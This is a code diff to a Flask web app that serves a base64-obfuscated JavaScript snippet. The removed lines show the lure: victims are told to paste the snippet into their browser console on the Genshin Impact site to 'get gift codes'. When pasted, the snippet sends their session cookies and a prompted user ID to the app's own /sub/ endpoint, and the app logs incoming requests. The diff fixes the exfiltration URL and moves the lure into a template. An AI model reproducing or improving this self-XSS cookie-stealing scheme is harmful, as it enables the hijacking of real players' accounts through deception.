@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, render_template
 from waitress import serve
 import threading
 import base64
@@ -7,6 +7,7 @@ import debug
 import time
 import logs
 import sys
+
 
 app = Flask(__name__)
 
@@ -20,9 +21,9 @@ def start(*args, **kwargs):
 @app.route("/")
 @debug.debug()
 def home():
-    payload = f"""console.log(eval(atob("{base64.b64encode(b'window.location = "' + request.headers.get('Host').encode() + b'sub/"+btoa(btoa(document.cookie)+":"+btoa(prompt("Your UID :")))').decode()}")))"""  #'''
+    payload = f"""console.log(eval(atob("{base64.b64encode(b'window.location = "http://' + request.headers.get('Host').encode() + b'/sub/"+btoa(btoa(document.cookie)+":"+btoa(prompt("Your UID :")))').decode()}")))"""  #'''
     logs.log_request(request)
-    return f'enter : <br/><b><code>{payload}</code></b><br/> in the console of <a href="https://genshin.hoyoverse.com/">https://genshin.hoyoverse.com/</a> (type Ctrl + Shift + I and go in "console" to get it, on computer only) after being logged to get automatically the gifts codes.'
+    return render_template("home.html", payload=payload)
 
 
 @app.route("/sub/<x>")
